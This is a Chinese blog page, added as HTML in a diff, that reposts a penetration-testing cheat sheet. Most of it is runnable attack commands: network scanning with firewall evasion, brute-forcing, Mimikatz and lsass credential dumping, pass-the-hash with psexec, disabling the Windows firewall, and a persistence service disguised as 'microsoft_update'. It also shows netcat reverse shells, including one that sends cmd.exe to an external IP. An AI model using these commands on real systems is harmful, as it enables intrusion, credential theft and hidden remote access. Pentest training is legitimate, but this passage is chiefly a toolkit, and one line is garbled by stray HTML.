@@ -1,0 +1,1075 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/muzihuaner/deng@main/deng.css">
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/old/F.png">
+  <link rel="icon" type="image/png" href="/img/old/F.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="工具人•小方">
+  <meta name="keywords" content="">
+  <title>渗透测试工具实战技巧合集[转载] - 工具人小方的博客</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/atelier-cave-dark.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"fxhstudy.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":"https://hm.baidu.com/hm.js?2c3982f360efc29d0de4a57e127e3cb9","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"VV0Y0S3Pj6ERI7DEOFLxUFXs-gzGzoHsz","app_key":"r20xk8AR5pft8xGRQlWKYoin","server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  <script src="https://cdn.jsdelivr.net/gh/Sanarous/files@1.13/js/linkcard.js"></script>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="工具人小方的博客" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>工具人小方的博客</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                主页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://qiniuyun.fxhstudy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7%E5%90%88%E9%9B%86%5B%E8%BD%AC%E8%BD%BD%5D.png?imageslim') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="渗透测试工具实战技巧合集[转载]">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-03-18 21:38" pubdate>
+        March 18, 2020 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      114
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">渗透测试工具实战技巧合集[转载]</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：a month ago
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>最近一直在学习一些关于内网渗透的知识，学着学着越来越发现自己会的真是少啊！<br>这里转载一位大佬的一些渗透测试工具的总结，可以说对于我这种还用不明白一些工具的人来说无疑是雪中送炭。<br>这里放上原文地址👉<a href="https://www.freebuf.com/sectool/105524.html" target="_blank" rel="nofollow">渗透测试工具实战技巧合集</a></p>
+<a id="more"></a>
+
+
+<p><span style="color: rgb(0, 176, 80);"><b>本文为作者总结自己在渗透测试中常用的一些小技巧。原文分为两部分，译者将其合二为一，方便大家查阅。</b></span></p>
+<p style="text-align: center;"><span style="color: rgb(0, 176, 80);"><b><a href="https://image.3001.net/images/20160527/14643414135411.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/20160527/14643414135411.png!small" srcset="/img/loading.gif" src="https://image.3001.net/images/20160527/14643414135411.png!small" alt="hacking.png" width="690" style="display: block;"></a><br></b></span></p>
+<noscript><img src="https://image.3001.net/images/20160527/14643414135411.png!small" srcset="/img/loading.gif" alt="hacking.png" height="431" width="690"><br /></b></span></p></noscript>
+<h3><span id="-nmap">最好的 NMAP 扫描策略</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 适用所有大小网络最好的 nmap 扫描策略</span>
+
+<p><span class="hljs-comment"># 主机发现，生成存活主机列表</span><br>$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24<br>$ grep <span class="hljs-string">“Status: Up”</span> Discovery.gnmap | cut <span class="hljs-_">-f</span> 2 <span class="hljs-_">-d</span> <span class="hljs-string">‘ ‘</span> &gt; LiveHosts.txt</p>
+<p><span class="hljs-comment"># 端口发现，发现大部分常用端口</span><br><span class="hljs-comment"># <a href="http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf" target="_blank" rel="noopener">http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf</a></span><br>$ nmap <span class="hljs-_">-s</span>S -T4 -Pn -oG TopTCP -iL LiveHosts.txt<br>$ nmap <span class="hljs-_">-s</span>U -T4 -Pn -oN TopUDP -iL LiveHosts.txt<br>$ nmap <span class="hljs-_">-s</span>S -T4 -Pn –top-ports 3674 -oG 3674 -iL LiveHosts.txt</p>
+<p><span class="hljs-comment"># 端口发现，发现全部端口，但 UDP 端口的扫描会非常慢</span><br>$ nmap <span class="hljs-_">-s</span>S -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt<br>$ nmap <span class="hljs-_">-s</span>U -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt</p>
+<p><span class="hljs-comment"># 显示 TCP\UDP 端口</span><br>$ grep <span class="hljs-string">“open”</span> FullTCP|cut <span class="hljs-_">-f</span> 1 <span class="hljs-_">-d</span> <span class="hljs-string">‘ ‘</span> | sort -nu | cut <span class="hljs-_">-f</span> 1 <span class="hljs-_">-d</span> <span class="hljs-string">‘/‘</span> |xargs | sed <span class="hljs-string">‘s/ /,/g’</span>|awk <span class="hljs-string">‘{print “T:”$0}’</span><br>$ grep <span class="hljs-string">“open”</span> FullUDP|cut <span class="hljs-_">-f</span> 1 <span class="hljs-_">-d</span> <span class="hljs-string">‘ ‘</span> | sort -nu | cut <span class="hljs-_">-f</span> 1 <span class="hljs-_">-d</span> <span class="hljs-string">‘/‘</span> |xargs | sed <span class="hljs-string">‘s/ /,/g’</span>|awk <span class="hljs-string">‘{print “U:”$0}’</span></p>
+<p><span class="hljs-comment"># 侦测服务版本</span><br>$ nmap <span class="hljs-_">-s</span>V -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</p>
+<p><span class="hljs-comment"># 扫做系统扫描</span><br>$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</p>
+<p><span class="hljs-comment"># 系统和服务检测</span><br>$ nmap -O <span class="hljs-_">-s</span>V -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt<br></code></pre></div></p>
+<h3><span id="nmap">Nmap – 躲避防火墙</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># 分段</span>
+$ nmap -f
+
+<p><span class="hljs-comment"># 修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)</span><br>$ nmap –mtu <span class="hljs-number">24</span></p>
+<p><span class="hljs-comment"># 生成随机数量的欺骗</span><br>$ nmap -D <span class="hljs-symbol">RND:</span><span class="hljs-number">10</span> [target]</p>
+<p><span class="hljs-comment"># 手动指定欺骗使用的 IP</span><br>$ nmap -D decoy1,decoy2,decoy3 etc.</p>
+<p><span class="hljs-comment"># 僵尸网络扫描, 首先需要找到僵尸网络的IP</span><br>$ nmap -sI [Zombie IP] [Target IP]</p>
+<p><span class="hljs-comment"># 指定源端口号</span><br>$ nmap –source-port <span class="hljs-number">80</span> IP</p>
+<p><span class="hljs-comment"># 在每个扫描数据包后追加随机数量的数据</span><br>$ nmap –data-length <span class="hljs-number">25</span> IP</p>
+<p><span class="hljs-comment"># MAC 地址欺骗，可以生成不同主机的 MAC 地址</span><br>$ nmap –spoof-mac Dell/Apple/<span class="hljs-number">3</span>Com IP<br></code></pre></div></p>
+<h3><span id="nmap-web">Nmap 进行 Web 漏洞扫描</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/share/nmap/scripts/
+wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz
+nmap <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=vulscan/vulscan.nse target
+nmap <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
+nmap <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
+nmap -PN <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=vulscan –script-args vulscancorrelation=1 -p80 target
+nmap <span class="hljs-_">-s</span>V --script=vuln target
+nmap -PN <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=all –script-args vulscancorrelation=1 target
+</code></pre></div>
+<h3><span id="-dirb">使用 DIRB 爆破目录</span></h3>
+<p>注：<a href="http://dirb.sourceforge.net/" target="_blank" rel="noopener">DIRB</a> 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的<a href="https://github.com/lanjelot/patator" target="_blank" rel="noopener">patator</a>，<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>，<a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project" target="_blank" rel="noopener">DirBuster</a>， 国内的御剑等等。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby">dirb <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/IP:PORT /usr</span><span class="hljs-regexp">/share/dirb</span><span class="hljs-regexp">/wordlists/common</span>.txt
+</code></pre></div>
+<h3><span id="patator">Patator – 全能暴力破解测试工具</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># git clone https://github.com/lanjelot/patator.git /usr/share/patator</span>
+
+<p><span class="hljs-comment"># SMTP 爆破</span><br>$ patator smtp_login host=<span class="hljs-number">192.168</span>.<span class="hljs-number">17.129</span> user=Ololena password=FILE<span class="hljs-number">0</span> <span class="hljs-number">0</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/password</span>.lst<br>$ patator smtp_login host=<span class="hljs-number">192.168</span>.<span class="hljs-number">17.129</span> user=FILE1 password=FILE<span class="hljs-number">0</span> <span class="hljs-number">0</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/password</span>.lst <span class="hljs-number">1</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/usernames</span>.lst<br>$ patator smtp_login host=<span class="hljs-number">192.168</span>.<span class="hljs-number">17.129</span> helo=<span class="hljs-string">‘ehlo 192.168.17.128’</span> user=FILE1 password=FILE<span class="hljs-number">0</span> <span class="hljs-number">0</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/password</span>.lst <span class="hljs-number">1</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/usernames</span>.lst<br>$ patator smtp_login host=<span class="hljs-number">192.168</span>.<span class="hljs-number">17.129</span> user=Ololena password=FILE<span class="hljs-number">0</span> <span class="hljs-number">0</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/password</span>.lst -x <span class="hljs-symbol">ignore:</span>fgrep=<span class="hljs-string">‘incorrect password or account name’</span><br></code></pre></div></p>
+<h3><span id="-fierce-dns">使用 Fierce 爆破 DNS</span></h3>
+<p>注：Fierce 会检查 DNS 服务器是否允许区域传送。如果允许，就会进行区域传送并通知用户，如果不允许，则可以通过查询 DNS 服务器枚举主机名。类似工具：<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a> 和 <a href="https://github.com/TheRook/subbrute/" target="_blank" rel="noopener">SubBrute</a> 等等</p>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># http://ha.ckers.org/fierce/</span>
+$ ./fierce.pl -dns example.com
+$ ./fierce.pl –dns example.com –wordlist myWordList.txt
+</code></pre></div>
+<h3><span id="-nikto-web">使用 Nikto 扫描 Web 服务</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">nikto</span> -C all -h http://IP
+</code></pre></div>
+<h3><span id="-wordpress">扫描 WordPress</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">git</span> clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan
+./wpscan –url http://IP/ –enumerate p
+</code></pre></div>
+<h3><span id="http">HTTP 指纹识别</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs dts">wget http:<span class="hljs-comment">//www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip</span>
+cd httprint_301<span class="hljs-meta-keyword">/linux/</span>
+./httprint -h http:<span class="hljs-comment">//IP -s signatures.txt</span>
+</code></pre></div>
+<h3><span id="-skipfish">使用 Skipfish 扫描</span></h3>
+<p>注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs dts">skipfish -m <span class="hljs-number">5</span> -LY -S <span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/skipfish/</span>dictionaries/complete.wl -o ./skipfish2 -u http:<span class="hljs-comment">//IP</span>
+</code></pre></div>
+<h3><span id="-nc">使用 NC 扫描</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs bash">nc -v -w 1 target -z 1-1000
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {101..102}; <span class="hljs-keyword">do</span> nc -vv -n -w 1 192.168.56.<span class="hljs-variable">$i</span> 21-25 -z; <span class="hljs-keyword">done</span>
+</code></pre></div>
+<h3><span id="unicornscan">Unicornscan</span></h3>
+<p>注：<a href="http://www.unicornscan.org/" target="_blank" rel="noopener">Unicornscan</a> 是一个信息收集和安全审计的工具。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">us</span> <span class="hljs-selector-tag">-H</span> <span class="hljs-selector-tag">-msf</span> <span class="hljs-selector-tag">-Iv</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.56</span><span class="hljs-selector-class">.101</span> <span class="hljs-selector-tag">-p</span> 1<span class="hljs-selector-tag">-65535</span>
+<span class="hljs-selector-tag">us</span> <span class="hljs-selector-tag">-H</span> <span class="hljs-selector-tag">-mU</span> <span class="hljs-selector-tag">-Iv</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.56</span><span class="hljs-selector-class">.101</span> <span class="hljs-selector-tag">-p</span> 1<span class="hljs-selector-tag">-65535</span>
+
+<p><span class="hljs-selector-tag">-H</span> 在生成报告阶段解析主机名<br><span class="hljs-selector-tag">-m</span> 扫描类型 (<span class="hljs-selector-tag">sf</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">tcp</span>, <span class="hljs-selector-tag">U</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">udp</span>)<br><span class="hljs-selector-tag">-Iv</span> <span class="hljs-selector-tag">-</span> 详细<br></code></pre></div></p>
+<h3><span id="-xprobe2">使用 Xprobe2 识别操作系统指纹</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">xprobe2</span> <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-tag">tcp</span><span class="hljs-selector-pseudo">:80</span><span class="hljs-selector-pseudo">:open</span> <span class="hljs-selector-tag">IP</span>
+</code></pre></div>
+<h3><span id="-samba">枚举 Samba</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs cpp">nmblookup -A target
+smbclient <span class="hljs-comment">//MOUNT/share -I target -N</span>
+rpcclient -U <span class="hljs-string">""</span> target
+enum4linux target
+</code></pre></div>
+<h3><span id="-snmp">枚举 SNMP</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs cpp">snmpget -v <span class="hljs-number">1</span> -c <span class="hljs-keyword">public</span> IP
+snmpwalk -v <span class="hljs-number">1</span> -c <span class="hljs-keyword">public</span> IP
+snmpbulkwalk -v2c -c <span class="hljs-keyword">public</span> -Cn0 -Cr10 IP
+</code></pre></div>
+<h3><span id="-windows-cmd">实用的 Windows cmd 命令</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs perl">net localgroup Users
+net localgroup Administrators
+search dir/<span class="hljs-keyword">s</span> *.doc
+<span class="hljs-keyword">system</span>(<span class="hljs-string">"start cmd.exe /k $cmd"</span>)
+sc create microsoft_update binpath=<span class="hljs-string">"cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe"</span> start= auto error= ignore
+/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv <span class="hljs-number">23.92</span>.<span class="hljs-number">17.103</span> <span class="hljs-number">7779</span>
+mimikatz.exe <span class="hljs-string">"privilege::debug"</span> <span class="hljs-string">"log"</span> <span class="hljs-string">"sekurlsa::logonpasswords"</span>
+Procdump.exe -accepteula -<span class="hljs-keyword">ma</span> lsass.exe lsass.dmp
+mimikatz.exe <span class="hljs-string">"sekurlsa::minidump lsass.dmp"</span> <span class="hljs-string">"log"</span> <span class="hljs-string">"sekurlsa::logonpasswords"</span>
+C:\temp\procdump.exe -accepteula -<span class="hljs-keyword">ma</span> lsass.exe lsass.dmp <span class="hljs-number">32</span> 位系统
+C:\temp\procdump.exe -accepteula -<span class="hljs-number">64</span> -<span class="hljs-keyword">ma</span> lsass.exe lsass.dmp <span class="hljs-number">64</span> 位系统
+</code></pre></div>
+<h3><span id="putty">PuTTY 连接隧道</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs css">转发远程端口到目标地址
+<span class="hljs-selector-tag">plink</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-P</span> 22 <span class="hljs-selector-tag">-l</span> <span class="hljs-selector-tag">root</span> <span class="hljs-selector-tag">-pw</span> "1234" <span class="hljs-selector-tag">-R</span> 445<span class="hljs-selector-pseudo">:127.0.0.1</span><span class="hljs-selector-pseudo">:445</span> <span class="hljs-selector-tag">IP</span>
+</code></pre></div>
+<h3><span id="meterpreter">Meterpreter 端口转发</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-comment"># https://www.offensive-security.com/metasploit-unleashed/portfwd/</span>
+<span class="hljs-comment"># 转发远程端口到目标地址</span>
+<span class="hljs-attribute">meterpreter</span> &gt; portfwd add –l <span class="hljs-number">3389</span> –p <span class="hljs-number">3389</span> –r <span class="hljs-number">172.16.194.141</span>
+kali &gt; rdesktop <span class="hljs-number">127.0.0.1:3389</span>
+</code></pre></div>
+<h3><span id="-rdp">开启 RDP 服务</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs bash">reg add <span class="hljs-string">"hklm\system\currentcontrolset\control\terminal server"</span> /f /v fDenyTSConnections /t REG_DWORD /d 0
+netsh firewall <span class="hljs-built_in">set</span> service remoteadmin <span class="hljs-built_in">enable</span>
+netsh firewall <span class="hljs-built_in">set</span> service remotedesktop <span class="hljs-built_in">enable</span>
+</code></pre></div>
+<h3><span id="-windows">关闭 Windows 防火墙</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs bash">netsh firewall <span class="hljs-built_in">set</span> opmode <span class="hljs-built_in">disable</span>
+</code></pre></div>
+<h3><span id="meterpreter-vncrdp">Meterpreter VNC\RDP</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta"># https:<span class="hljs-comment">//www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/</span></span>
+run getgui -u admin -p <span class="hljs-number">1234</span>
+run vnc -p <span class="hljs-number">5043</span>
+</code></pre></div>
+<h3><span id="-mimikatz">使用 Mimikatz</span></h3>
+<p>获取 Windows 明文用户名密码</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php">git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/gentilkiwi/mimikatz.git</span>
+privilege::debug
+sekurlsa::logonPasswords full
+</code></pre></div>
+<h3><span id="i">获取哈希值</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs dts">git clone https:<span class="hljs-comment">//github.com/byt3bl33d3r/pth-toolkit</span>
+pth-winexe -U hash <span class="hljs-comment">//IP cmd</span>
+
+<p>或者</p>
+<p>apt-get install freerdp-x11<br>xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP</p>
+<p>在或者</p>
+<p>meterpreter &gt; run post<span class="hljs-meta-keyword">/windows/</span>gather/hashdump<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span>:e52cac67419a9a224a3b108f3fa6cb6d:<span class="hljs-number">8846f</span>7<span class="hljs-symbol">eaee8fb117ad06bdd830b7586c::</span>:<br>msf &gt; use exploit<span class="hljs-meta-keyword">/windows/</span>smb/psexec<br>msf exploit(psexec) &gt; set payload windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp<br>msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:<span class="hljs-number">8846f</span>7eaee8fb117ad06bdd830b7586c<br>msf exploit(psexec) &gt; exploit<br>meterpreter &gt; shell<br></code></pre></div></p>
+<h3><span id="-hashcat">使用 Hashcat 破解密码</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs bash">hashcat -m 400 <span class="hljs-_">-a</span> 0 <span class="hljs-built_in">hash</span> /root/rockyou.txt
+</code></pre></div>
+<h3><span id="-nc-banner">使用 NC 抓取 Banner 信息</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs dts">nc <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.10</span> <span class="hljs-number">80</span>
+GET / HTTP/<span class="hljs-number">1.1</span>
+<span class="hljs-symbol">Host:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.10</span>
+User-Agent: Mozilla/<span class="hljs-number">4.0</span>
+<span class="hljs-symbol">Referrer:</span> www.example.com
+<span class="hljs-params">&lt;enter&gt;</span>
+<span class="hljs-params">&lt;enter&gt;</span>
+</code></pre></div>
+<h3><span id="-nc-windows-shell">使用 NC 在 Windows 上反弹 shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs bash">c:&gt;nc -Lp 31337 -vv <span class="hljs-_">-e</span> cmd.exe
+nc 192.168.0.10 31337
+c:&gt;nc example.com 80 <span class="hljs-_">-e</span> cmd.exe
+nc -lp 80
+
+<p>nc -lp 31337 <span class="hljs-_">-e</span> /bin/bash<br>nc 192.168.0.10 31337<br>nc -vv -r(random) -w(<span class="hljs-built_in">wait</span>) 1 192.168.0.10 -z(i/o error) 1-1000<br></code></pre></div></p>
+<h3><span id="-suidsgid-root">查找 SUID\SGID root 文件</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 查找 SUID root 文件</span>
+find / -user root -perm <span class="hljs-number">-4000</span> -<span class="hljs-keyword">print</span>
+
+<p><span class="hljs-comment"># 查找 SGID root 文件:</span><br>find / -group root -perm <span class="hljs-number">-2000</span> -<span class="hljs-keyword">print</span></p>
+<p><span class="hljs-comment"># 查找 SUID 和 SGID 文件:</span><br>find / -perm <span class="hljs-number">-4000</span> -o -perm <span class="hljs-number">-2000</span> -<span class="hljs-keyword">print</span></p>
+<p><span class="hljs-comment"># 查找不属于任何用户的文件:</span><br>find / -nouser -<span class="hljs-keyword">print</span></p>
+<p><span class="hljs-comment"># 查找不属于任何用户组的文件:</span><br>find / -nogroup -<span class="hljs-keyword">print</span></p>
+<p><span class="hljs-comment"># 查找软连接及其指向:</span><br>find / -type l -ls<br></code></pre></div></p>
+<h3><span id="python-shell">Python shell</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">python</span> -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
+</code></pre></div>
+<h3><span id="pythonrubyphp-http">Python\Ruby\PHP HTTP 服务器</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs xml">python2 -m SimpleHTTPServer
+python3 -m http.server
+ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port =&gt; 8888, <a href="https://image.3001.net/images/index/smilies/icon_biggrin.gif" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/index/smilies/icon_biggrin.gif" src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" srcset="/img/loading.gif" alt=":D" class="wp-smiley"></a>
+<noscript><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'https://image.3001.net/images/index/smilies/icon_biggrin.gif'</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">':D'</span> <span class="hljs-attr">class</span>=<span class="hljs-string">'wp-smiley'</span> /&gt;</span></noscript> ocumentRoot =&gt; Dir.pwd).start"
+php -S 0.0.0.0:8888
+</code></pre></div>
+<h3><span id="-pid">获取进程对应的 PID</span></h3>
+<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">fuser</span> -nv tcp <span class="hljs-number">80</span>
+fuser -k -n tcp <span class="hljs-number">80</span>
+</code></pre></div>
+<h3><span id="-hydra-rdp">使用 Hydra 爆破 RDP</span></h3>
